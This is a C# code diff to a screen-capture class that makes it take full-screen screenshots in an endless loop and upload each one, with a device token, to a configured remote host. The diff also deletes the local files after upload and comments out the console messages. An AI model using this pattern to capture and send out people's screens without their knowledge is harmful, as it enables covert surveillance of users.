@@ -16,13 +16,13 @@ using System.Xml.Serialization;
 using Newtonsoft.Json.Linq;
 using Newtonsoft.Json;
 using System.Net.Http;
+using ScreenTask;
 
 namespace AppRealtime
 {
     public class ScreenTask
     {
         private string SettingPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "appsettings.xml");
-        private string ScreenShotImageFile;
         private ReaderWriterLock rwl = new ReaderWriterLock();
         private AppSettings _currentSettings = new AppSettings();
         public AppSettings CurrentSettings { get { return _currentSettings; } }
@@ -33,16 +33,22 @@ namespace AppRealtime
 
         public async Task StartCaptureScreenAsync()
         {
-            ScreenShotImageFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"{_currentSettings.DeviceToken}.png");
             _ = Task.Factory.StartNew(() => CaptureScreenEvery(_currentSettings.ScreenshotsSpeed), TaskCreationOptions.LongRunning);
         }
         private async Task CaptureScreenEvery(int msec)
         {
-            //while (true)
+            while (true)
             {
-                TakeScreenshot(_currentSettings.IsShowMouseEnabled);
+                TakeScreenshot();
                 msec = _currentSettings.ScreenshotsSpeed;
                 await Task.Delay(msec);
+            }
+        }
+
+        private async Task UploadImage(string imagePath)
+        {
+            try
+            {
                 _ = Task.Run(async () =>
                 {
                     try
@@ -61,15 +67,16 @@ namespace AppRealtime
                                 var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
                                 request.Headers.Add("accept", "*/*");
                                 var content = new MultipartFormDataContent();
-                                content.Add(new StreamContent(File.OpenRead(ScreenShotImageFile)), "image", ScreenShotImageFile);
+                                content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
+                                content.Add(new StringContent(Globals.UUID), "token");
                                 request.Content = content;
                                 var response = await client.SendAsync(request);
                                 response.EnsureSuccessStatusCode();
                                 string result = await response.Content.ReadAsStringAsync();
-                                Console.WriteLine(result);
+                                //Console.WriteLine(result);
                                 if (result.Contains("successfully"))
                                 {
-                                    Console.WriteLine("Files uploaded successfully");
+                                    //Console.WriteLine("Files uploaded successfully");
                                     break;
                                 }
                             }
@@ -79,51 +86,44 @@ namespace AppRealtime
                             }
                         }
                     }
+                    catch (Exception ex) { Console.WriteLine($"{ex.Message}"); }
                     finally
                     {
-
+                        File.Delete(imagePath);
                     }
                 });
             }
+            catch (Exception ex)
+            {
+
+            }
         }
-        private void TakeScreenshot(bool captureMouse)
+
+        private void TakeScreenshot()
         {
             try
             {
+                string imageFile = Path.GetTempFileName();
+
                 ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Png);
 
                 var encoderQuality = System.Drawing.Imaging.Encoder.Quality;
                 var encoderParam = new EncoderParameter(encoderQuality, _currentSettings.ImageQuality);
                 var encoderParams = new EncoderParameters(1);
                 encoderParams.Param[0] = encoderParam;
-                if (captureMouse)
-                {
-                    var bmp = ScreenCapturePInvoke.CaptureFullScreen(true);
-                    rwl.AcquireWriterLock(Timeout.Infinite);
-                    bmp.Save(ScreenShotImageFile, jpgEncoder, encoderParams);
-                    rwl.ReleaseWriterLock();
 
-                    bmp.Dispose();
-                    bmp = null;
-                    return;
-                }
+                var bmp = ScreenCapturePInvoke.CaptureFullScreen(true);
+                rwl.AcquireWriterLock(Timeout.Infinite);
+                bmp.Save(imageFile, jpgEncoder, encoderParams);
+                rwl.ReleaseWriterLock();
 
-                Rectangle bounds = Screen.AllScreens[_currentSettings.SelectedScreenIndex].Bounds;
-                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
-                {
-                    using (Graphics g = Graphics.FromImage(bitmap))
-                    {
-                        g.CopyFromScreen(new Point(bounds.X, bounds.Y), Point.Empty, bounds.Size);
-                    }
-                    rwl.AcquireWriterLock(Timeout.Infinite);
+                bmp.Dispose();
+                bmp = null;
 
-                    bitmap.Save(ScreenShotImageFile, jpgEncoder, encoderParams);
-                    rwl.ReleaseWriterLock();
-                }
+                UploadImage(imageFile);
             }
             catch (Exception ex)
             {
-
                 Trace.WriteLine(ex.ToString());
             }
         }
